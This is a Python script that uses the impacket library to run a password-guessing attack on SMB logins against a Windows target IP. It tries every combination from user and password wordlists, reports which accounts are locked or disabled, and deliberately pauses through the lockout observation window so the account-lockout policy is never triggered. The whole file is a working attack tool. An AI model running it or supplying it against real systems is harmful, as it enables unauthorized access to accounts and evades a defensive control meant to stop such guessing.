from impacket.smbconnection import SMBConnection
import time
import argparse

"""
Function to perform SMB authentication using a given username and password. 
Returns a tuple with two values: a boolean indicating success or failure, and a 
string with the result message.
"""
def smb_auth(username, password, target_ip):
    try:
        smb = SMBConnection(target_ip, target_ip)
        smb.login(username, password)
        smb.logoff()
        return True, "Authentication successful"
    except Exception as e:
        error_message = str(e)
        if "STATUS_ACCOUNT_DISABLED" in error_message:
            return False, "Account is disabled"
        elif "STATUS_ACCOUNT_LOCKED_OUT" in error_message:
            return False, "Account is locked out"
        elif "STATUS_LOGON_FAILURE" in error_message:
            return False, "Wrong username/password"
        elif "Connection error" in error_message:
            return False, "Connection error"
        else:
            return False, "Other error"
"""
Function to load a list of credentials from a file. Returns a list of 
credentials.
"""
def load_credentials_from_file(file_path):
    credentials = []
    with open(file_path, 'r') as file:
        for line in file:
            credentials.append(line.strip())
    return credentials

# Main function to perform the SMB authentication process.
def main(users_file, passwords_file, target_ip, max_attempts, interval):  
    users = load_credentials_from_file(users_file)
    passwords = load_credentials_from_file(passwords_file)

    """
    Prints the number of possible combinations based on the length of the list 
    of users and passwords.
    """
    total_combinations = len(users) * len(passwords)
    print(f'Total number of combinations to test: {total_combinations}')

    """
    Print the estimated time it would take to test the user/password 
    combinations.
    """
    total_time = (total_combinations * interval) / max_attempts
    print(f'Approximate time: {total_time} minute(s)')

    """
    It performs the brute force attack, sends to the smb_auth function and 
    starts a counter, if it reaches the maximum attempts defined, it will wait 
    the time defined in the LockoutObservationWindow and resumes the attack.
    """
    for user in users:
        count = 0
        for password in passwords:
            success, message = smb_auth(user, password, target_ip)
            print(f'Username: {user}, Password: {password} - {message}')
            if success:
                break
            else:
                count += 1
                if count == max_attempts:
                    time.sleep(interval * 60)
                    count = 0

"""
It receives as arguments the user file, passwords, the IP of the target, 
the number of attempts before the account is locked and the time window in 
which the session attempt counter is set to 0.
"""
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('users_file', help='Users file')
    parser.add_argument('passwords_file', help='Passwords file')
    parser.add_argument('target_ip', help='Windows target IP')
    parser.add_argument('--max_attempts', type=int, default=5, help='Account \
                        lockout')
    parser.add_argument('--interval', type=int, default=15, help='Lockout \
                        observation window')
    args = parser.parse_args()

    main(args.users_file, args.passwords_file, args.target_ip, 
        args.max_attempts, args.interval)
